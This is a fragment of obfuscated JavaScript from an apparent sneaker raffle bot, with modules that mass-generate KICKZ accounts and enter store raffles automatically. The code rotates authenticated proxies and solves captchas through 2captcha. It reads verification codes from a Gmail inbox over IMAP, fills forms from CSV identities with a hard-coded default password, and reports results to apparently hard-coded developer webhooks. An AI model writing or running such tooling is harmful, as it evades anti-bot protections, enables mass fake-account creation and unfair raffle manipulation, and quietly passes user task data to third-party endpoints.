                        console['log'](_0x508dba() + '\x20[' + _0x5c6b7e['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x28516f['type']('#comp_firstname', '' + _0x348d3e[_0xc95293]['FirstName']), await _0x28516f['waitForSelector']('#comp_lastname'), await _0x28516f['type']('#comp_lastname', '' + _0x348d3e[_0xc95293]['LastName']), await _0x28516f['waitForSelector']('#comp_email'), await _0x28516f['type']('#comp_email', '' + _0x348d3e[_0xc95293]['Email']), await _0x28516f['waitForSelector']('#comp_paypalemail'), await _0x28516f['type']('#comp_paypalemail', '' + _0x348d3e[_0xc95293]['Email']), await _0x28516f['waitForSelector']('#comp_mobile_end'), await _0x28516f['type']('#comp_mobile_end', '' + _0x348d3e[_0xc95293]['Phone']), await _0x28516f['waitForSelector']('#comp_dob'), await _0x28516f['type']('#comp_dob', '08/09/1992'), console['log'](_0x508dba() + '\x20[' + _0x5c6b7e['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x348d3e[_0xc95293]['Size'] == 'RANDOM') {
                            const _0x24cc25 = await _0x28516f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x9bde0f => {
                                return _0x9bde0f['map'](_0x1eb807 => _0x1eb807['value']);
                            });
                            var _0x19a0ab = Math['round'](Math['random']() * (_0x24cc25['length'] - 0x2));
                            await _0x28516f['select']('#shoesize', _0x24cc25[_0x19a0ab + 0x1]), await _0x54262e(0x3e8);
                        } else {
                            const _0x1a31c9 = await _0x28516f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x278d65 => {
                                return _0x278d65['map'](_0x23a5ac => _0x23a5ac['innerText']);
                            }), _0x26c99d = await _0x28516f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1551b5 => {
                                return _0x1551b5['map'](_0x29b519 => _0x29b519['value']);
                            });
                            var _0x23ea6b = _0x348d3e[_0xc95293]['Size'];
                            for (var _0x5f55df = 0x1; _0x5f55df < _0x26c99d['length']; _0x5f55df++) {
                                var _0x5291ed = _0x1a31c9[_0x5f55df]['split']('\x20')[0x0];
                                if (_0x5291ed == _0x23ea6b) {
                                    await _0x28516f['select']('#shoesize', _0x26c99d[_0x5f55df]);
                                    break;
                                } else {
                                    if (_0x5f55df + 0x1 == _0x26c99d['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x28516f['waitForSelector']('#comp_address1'), await _0x28516f['type']('#comp_address1', _0x348d3e[_0xc95293]['Address1'] + '\x20' + _0x348d3e[_0xc95293]['HouseNumber']), await _0x28516f['waitForSelector']('#comp_address2'), await _0x28516f['type']('#comp_address2', '' + _0x348d3e[_0xc95293]['Address2']), await _0x28516f['waitForSelector']('#comp_address2'), await _0x28516f['type']('#comp_address3', '' + _0x348d3e[_0xc95293]['City']), await _0x28516f['waitForSelector']('#comp_postcode'), await _0x28516f['type']('#comp_postcode', '' + _0x348d3e[_0xc95293]['Zip']), console['log'](_0x508dba() + '\x20[' + _0x5c6b7e['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x54262e(0x4b0), await _0x28516f['click']('label#emailhold'), await _0x54262e(0x5dc), await _0x28516f['click']('#preauth_tandc_email\x20>\x20label'), await _0x54262e(0x5dc), await _0x28516f['click']('#submit'), await _0x28516f['waitForSelector']('#paymentWrap'), console['log'](_0x508dba() + '\x20[' + _0x5c6b7e['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20' + _0x351e10['blue']('Awaiting\x20Paypal\x20Payment')), _0x79c36f['on']('targetcreated', async _0x46ad7b => {
                            if (_0x46ad7b['type']() === 'page') {
                                const _0x566947 = await _0x46ad7b['page']();
                                async function _0x2909c7() {
                                    try {
                                        await _0x28516f['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x7c017b = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x251a5a() {
                                    try {
                                        await _0x28516f['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x23c87a = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x251a5a(), _0x2909c7(), await _0x54262e(0x493e0);
                            }
                        });
                        async function _0x17d724() {
                            for (let _0x2a869c = 0x0; _0x2a869c < 0x12c; _0x2a869c++) {
                                if (_0x23c87a == !![]) {
                                    _0x5b2f6d = 'no', _0x3444cf(_0x348d3e[_0xc95293], _0x5c6b7e), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x5c6b7e['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                                        try {
                                            await _0x459a7f(_0x196f8e['webhook'], _0x5b74f9['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x5b74f9['succesDEVMSG']), await _0x54262e(0xc8);
                                    try {
                                        await _0x459a7f(_0xf106b7, _0x5b74f9['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x7c017b)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x54262e(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x54262e(0xbb8), await _0x28516f['click']('.zoid-outlet'), await _0x54262e(0x7d0), await _0x17d724();
                    } catch (_0x54b992) {
                        console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5c6b7e['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20' + _0x54b992)), _0x20995f = '' + _0x54b992;
                        var _0x4120b6 = await _0x107feb(_0x348d3e[_0xc95293], _0x5c6b7e, 'dev', !![], _0x20995f);
                        _0x5b74f9['errorDEV'] = { 'embeds': [_0x4120b6] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x5b74f9['errorDEV']), await _0x459a7f(_0x491127, _0x5b74f9['errorDEV']);
                    } finally {
                        _0x79c36f && _0x79c36f['close']();
                        if (_0x5b2f6d == 'yes' && _0x5bfe71 != 0x5 && _0x20995f != 'Size\x20Not\x20Found') {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5c6b7e['name'] + ']\x20Task\x20' + (_0xc95293 + 0x1) + '\x20:\x20Retrying')), _0xc95293 = _0xc95293 - 0x1, _0x5bfe71 = _0x5bfe71 + 0x1;
                            continue;
                        }
                        _0x5b2f6d == 'yes' && _0x5bfe71 >= 0x5 && (_0x29ff38(afew[_0xc95293], _0x5c6b7e), _0x5b2f6d = 'no', _0x5bfe71 = 0x0), console['log']('Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x337d3d, _0x27d7a0, _0x3d57e3) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x9b45d3 = 0x0; _0x9b45d3 < _0x27d7a0['length']; _0x9b45d3++) {
                        const _0x12dda8 = 'https://www.kickz.com/login';
                        if (_0x3d1c30 != 'yes')
                            var _0x3d1c30 = '', _0x147e32 = 0x0;
                        _0x3feae7(_0x337d3d['name'] + '\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20/\x20' + _0x27d7a0['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x27d7a0, _0x9b45d3);
                        var _0x26363b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x2ccb52
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x196f8e['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5c71b0
                                }
                            ]
                        }];
                        const _0x3688bb = { 'embeds': _0x26363b };
                        var _0x4a5a63 = await _0x107feb(_0x27d7a0[_0x9b45d3], _0x337d3d, 'acc', ![]);
                        const _0x22e71f = { 'succesDEVMSG': { 'embeds': [_0x4a5a63] } };
                        if (_0x27d7a0[_0x9b45d3]['Email'] == '' || _0x27d7a0[_0x9b45d3]['FirstName'] == '' || _0x27d7a0[_0x9b45d3]['LastName'] == '') {
                            console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x27d7a0[_0x9b45d3]['Password'] == '' && (_0x27d7a0[_0x9b45d3]['Password'] = 'JRaffles23!');
                        if (_0x196f8e['useRandomProxy'] = ![])
                            var _0x57bcc6 = _0x3d57e3[_0x9b45d3]['split'](':');
                        else
                            var _0x57b503 = Math['round'](Math['random']() * (_0x3d57e3['length'] - 0x1)), _0x57bcc6 = _0x3d57e3[_0x57b503]['split'](':');
                        const _0x539cb4 = await _0x3dd4ff['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x57bcc6[0x0] + ':' + _0x57bcc6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x50c623 = await _0x539cb4['newPage']();
                            await _0x50c623['authenticate']({
                                'username': '' + _0x57bcc6[0x2],
                                'password': '' + _0x57bcc6[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50c623['setRequestInterception'](!![]), _0x50c623['on']('request', _0x477c3e => {
                                _0x477c3e['resourceType']() === 'image' || _0x477c3e['resourceType']() === 'font' || _0x477c3e['resourceType']() === 'media' ? _0x477c3e['abort']() : _0x477c3e['continue']();
                            }), await _0x50c623['goto'](_0x12dda8), await _0x54262e(0xbb8), console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x50c623['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x50c623['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x50c623['waitForSelector']('#button-register'), await _0x54262e(0x7d0), await _0x50c623['evaluate'](() => {
                                const _0x5d8f60 = document['querySelector']('#button-register');
                                _0x5d8f60['click']();
                            }), console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x54262e(0x1388), await _0x50c623['waitForSelector']('#customer_salutation'), await _0x50c623['select']('#customer_salutation', 'mr'), await _0x54262e(0x7d0), await _0x50c623['waitForSelector']('#customer_firstname'), await _0x50c623['type']('#customer_firstname', '' + _0x27d7a0[_0x9b45d3]['FirstName']), await _0x54262e(0x352), await _0x50c623['waitForSelector']('#customer_lastname'), await _0x50c623['type']('#customer_lastname', '' + _0x27d7a0[_0x9b45d3]['LastName']), await _0x54262e(0x352), await _0x50c623['type']('#email-input', '' + _0x27d7a0[_0x9b45d3]['Email']), await _0x54262e(0x352), await _0x50c623['type']('#email-confirm-input', '' + _0x27d7a0[_0x9b45d3]['Email']), await _0x54262e(0x352), await _0x50c623['type']('#register-password', '' + _0x27d7a0[_0x9b45d3]['Password']), await _0x54262e(0x352), await _0x50c623['type']('#password-confirm', '' + _0x27d7a0[_0x9b45d3]['Password']), await _0x54262e(0x352), console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x50c623['click']('#consent'), await _0x54262e(0x1f4);
                            const _0x515dea = await _0x50c623['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x515dea) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x50c623['click']('#buttonRegister');
                            try {
                                await _0x50c623['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x27d7a0[_0x9b45d3]['Email']), await _0x54262e(0x4b0);
                            async function _0xabf5dc() {
                                var _0x39c298, _0xc2af5e = ![];
                                for (var _0x3c708c = 0x0; _0x3c708c < 0x18; _0x3c708c++) {
                                    async function _0xe72686() {
                                        var _0x34f79d = new _0x5deaaa({
                                            'user': _0x196f8e['masterMail'],
                                            'password': _0x196f8e['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x4d0552(_0x31ed6a) {
                                            _0x34f79d['openBox']('INBOX', ![], _0x31ed6a);
                                        }
                                        _0x34f79d['once']('ready', function () {
                                            console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x4d0552(function (_0x5d08c4, _0x1851e3) {
                                                console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x5d08c4)
                                                    throw _0x5d08c4;
                                                _0x34f79d['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x31ec49, _0x3b7672) {
                                                    if (!_0x3b7672 || !_0x3b7672['length'])
                                                        console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x34f79d['end']();
                                                    else {
                                                        var _0x541c7a = _0x34f79d['seq']['fetch'](_0x3b7672, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x541c7a['on']('message', function (_0x448045, _0x42650e) {
                                                            var _0xd03c69 = '(#' + _0x42650e + ')\x20';
                                                            _0x448045['on']('body', function (_0x4d9c31, _0x1a3a25) {
                                                                _0x45f099(_0x4d9c31, (_0x181f36, _0x55f9f7) => {
                                                                    if (_0x55f9f7['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x53e12e = _0x55f9f7['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x43d212 = _0x53e12e[0x1]['split']('<')[0x0];
                                                                        _0x39c298 = _0x43d212;
                                                                    }
                                                                });
                                                            }), _0x448045['once']('end', function () {
                                                            });
                                                        }), _0x541c7a['once']('error', function (_0x19414a) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x541c7a['once']('end', function () {
                                                            _0x34f79d['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x34f79d['once']('error', function (_0x174fd0) {
                                            console['log'](_0x351e10['red'](_0x174fd0['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xc2af5e = !![];
                                        }), _0x34f79d['once']('end', async function () {
                                        }), _0x34f79d['connect']();
                                    }
                                    _0xe72686(), await _0x54262e(0x1388);
                                    if (_0x39c298)
                                        return _0x39c298;
                                    if (_0xc2af5e)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3c708c == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xabf5dc(), _0x54262e(0x320), console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Verifying..'), await _0x50c623['type']('#verificationCode', code), await _0x54262e(0x1f4), await _0x50c623['click']('#buttonVerify'), await _0x54262e(0x190), await _0x50c623['click']('#buttonVerify'), await _0x54262e(0x3e8);
                            try {
                                await _0x50c623['waitForSelector']('div.b-user_greeting'), _0x3d1c30 = 'no', console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Account\x20' + _0x27d7a0[_0x9b45d3]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x3a2baa['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x27d7a0[_0x9b45d3]['Email'] + ',' + _0x27d7a0[_0x9b45d3]['Password'] + ','), console['log'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Account\x20' + _0x27d7a0[_0x9b45d3]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x22e71f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x459a7f(_0x1796bc, _0x22e71f['succesDEVMSG']);
                            } catch {
                                _0x3d1c30 = 'no', console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x4be079) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20' + _0x4be079)), _0x26363b[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x26363b[0x0]['description'] = '' + _0x4be079, await _0x459a7f(_0x491127, _0x3688bb), _0x3d1c30 = 'yes';
                        } finally {
                            _0x539cb4 && _0x539cb4['close']();
                            if (_0x3d1c30 == 'yes' && _0x147e32 != 0x5) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x337d3d['name'] + ']\x20Task\x20' + (_0x9b45d3 + 0x1) + '\x20:\x20Retrying')), _0x9b45d3 = _0x9b45d3 - 0x1, _0x147e32 = _0x147e32 + 0x1;
                                continue;
                            }
                            _0x3d1c30 == 'yes' && _0x147e32 >= 0x5 && (_0x29ff38(_0x27d7a0[_0x9b45d3], _0x337d3d), _0x3d1c30 = 'no', _0x147e32 = 0x0), console['log']('Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0xd6351a, _0x10bbca, _0x2ceb7d) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x67a87f = 0x0; _0x67a87f < _0x10bbca['length']; _0x67a87f++) {
                        var _0x4589ec;
                        if (_0x5665da != 'yes')
                            var _0x5665da = '', _0x12fd03 = 0x0;
                        _0x3feae7(_0xd6351a['name'] + '\x20Task\x20' + (_0x67a87f + 0x1) + '\x20/\x20' + _0x10bbca['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24);
                        var _0x80ca8b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x2ccb52
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x10bbca[_0x67a87f]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x10bbca[_0x67a87f]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x196f8e['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5c71b0
                                }
                            ]
                        }], _0x10f6e1 = await _0x107feb(_0x10bbca[_0x67a87f], _0xd6351a, 'dev', ![]), _0x13e6d1 = await _0x107feb(_0x10bbca[_0x67a87f], _0xd6351a, 'pub', ![]);
                        const _0x4f0655 = {
                            'succesDEVMSG': { 'embeds': [_0x10f6e1] },
                            'succesPUBMSG': { 'embeds': [_0x13e6d1] }
                        };
                        await _0x2e3034(_0x10bbca, _0x67a87f);
                        if (_0x10bbca[_0x67a87f]['Email'] == '' || _0x10bbca[_0x67a87f]['Password'] == '' || _0x10bbca[_0x67a87f]['FirstName'] == '' || _0x10bbca[_0x67a87f]['LastName'] == '') {
                            console['log'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x196f8e['useRandomProxy'] = ![])
                            var _0x34b1af = _0x2ceb7d[_0x67a87f]['split'](':');
                        else
                            var _0x3020a4 = Math['round'](Math['random']() * (_0x2ceb7d['length'] - 0x1)), _0x34b1af = _0x2ceb7d[_0x3020a4]['split'](':');
                        const _0x601cb0 = await _0x3dd4ff['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x34b1af[0x0] + ':' + _0x34b1af[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xfc5527 = await _0x601cb0['newPage']();
                            await _0xfc5527['authenticate']({
                                'username': '' + _0x34b1af[0x2],
                                'password': '' + _0x34b1af[0x3]
                            }), console['log'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Getting\x20Session'), await _0xfc5527['setRequestInterception'](!![]), _0xfc5527['on']('request', _0x293db1 => {
                                _0x293db1['resourceType']() === 'image' || _0x293db1['resourceType']() === 'font' || _0x293db1['resourceType']() === 'media' ? _0x293db1['abort']() : _0x293db1['continue']();
                            }), await _0xfc5527['goto']('' + _0x10bbca[_0x67a87f]['Url'], { 'waitUntil': 'networkidle2' }), await _0x54262e(0x12c);
                            try {
                                await _0xfc5527['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0xfc5527['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Logging\x20in'), await _0xfc5527['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xfc5527['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xfc5527['waitForSelector']('#username'), await _0xfc5527['type']('#username', _0x10bbca[_0x67a87f]['Email']), await _0xfc5527['waitForSelector']('#password'), await _0xfc5527['type']('#password', _0x10bbca[_0x67a87f]['Password']), await _0x54262e(0x190), await _0xfc5527['click']('#buttonSubmit'), await _0xfc5527['waitForSelector']('div.b-user_greeting'), console['log'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Getting\x20Product'), await _0x54262e(0x1f4), await _0xfc5527['goto']('' + _0x10bbca[_0x67a87f]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x10bbca[_0x67a87f]['Size']);
                            let _0x231d94 = _0x10bbca[_0x67a87f]['Size']['replace']('.5', '\x201/2');
                            await _0xfc5527['click']('button[title=\x22' + _0x231d94 + '\x22]'), await _0x54262e(0x1f4);
                            try {
                                await _0xfc5527['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x54262e(0x12c), console['log'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Filling\x20Information'), await _0xfc5527['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x54262e(0x12c), await _0xfc5527['type']('#dwfrm_raffle_addressFields_firstName', _0x10bbca[_0x67a87f]['FirstName']), await _0x54262e(0x12c), await _0xfc5527['type']('#dwfrm_raffle_addressFields_lastName', _0x10bbca[_0x67a87f]['LastName']), await _0x54262e(0x12c), await _0xfc5527['select']('#dwfrm_raffle_addressFields_country', _0x10bbca[_0x67a87f]['Country']), await _0x54262e(0x12c), await _0xfc5527['type']('#dwfrm_raffle_addressFields_city', _0x10bbca[_0x67a87f]['City']), await _0x54262e(0x12c);
                            _0x10bbca[_0x67a87f]['Postcode'] == undefined && (_0x10bbca[_0x67a87f]['Postcode'] = _0x10bbca[_0x67a87f]['Zip']);
                            await _0xfc5527['type']('#dwfrm_raffle_addressFields_postalCode', _0x10bbca[_0x67a87f]['Postcode']), await _0x54262e(0x12c), await _0xfc5527['type']('#dwfrm_raffle_addressFields_address1', _0x10bbca[_0x67a87f]['Address1']), await _0x54262e(0x12c), await _0xfc5527['type']('#dwfrm_raffle_addressFields_address2', _0x10bbca[_0x67a87f]['HouseNumber']), await _0x54262e(0x12c), await _0xfc5527['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x10bbca[_0x67a87f]['Address2']), await _0x54262e(0x12c), await _0xfc5527['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x54262e(0x12c), await _0xfc5527['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x10bbca[_0x67a87f]['Follower']), await _0x54262e(0x1f4), await _0xfc5527['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x54262e(0x1f4), console['log'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20' + _0x351e10['blue']('Awaiting\x20Paypal\x20Payment')), await _0xfc5527['click']('.b-paypal_button');
                            try {
                                await _0xfc5527['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x5665da = 'no', _0x3444cf(_0x10bbca[_0x67a87f], _0xd6351a), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x4f0655['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x4f0655['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0xf106b7, _0x4f0655['succesPUBMSG']);
                            } catch (_0x2bff81) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x2bff81)), _0x4589ec = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x2bff81;
                                var _0x560a5d = await _0x107feb(_0x10bbca[_0x67a87f], _0xd6351a, 'dev', !![], _0x4589ec);
                                _0x4f0655['errorDEV'] = { 'embeds': [_0x560a5d] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x4f0655['errorDEV']), await _0x459a7f(_0x491127, _0x4f0655['errorDEV']);
                            }
                        } catch (_0x334ed8) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0xd6351a['name'] + ']\x20Task\x20' + (_0x67a87f + 0x1) + '\x20:\x20' + _0x334ed8)), _0x4589ec = '' + _0x334ed8;
                            var _0x560a5d = await _0x107feb(_0x10bbca[_0x67a87f], _0xd6351a, 'dev', !![], _0x4589ec);
                            _0x4f0655['errorDEV'] = { 'embeds': [_0x560a5d] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x4f0655['errorDEV']), await _0x459a7f(_0x491127, _0x4f0655['errorDEV']), _0x5665da = 'yes';
                        } finally {
                            _0x601cb0 && _0x601cb0['close']();
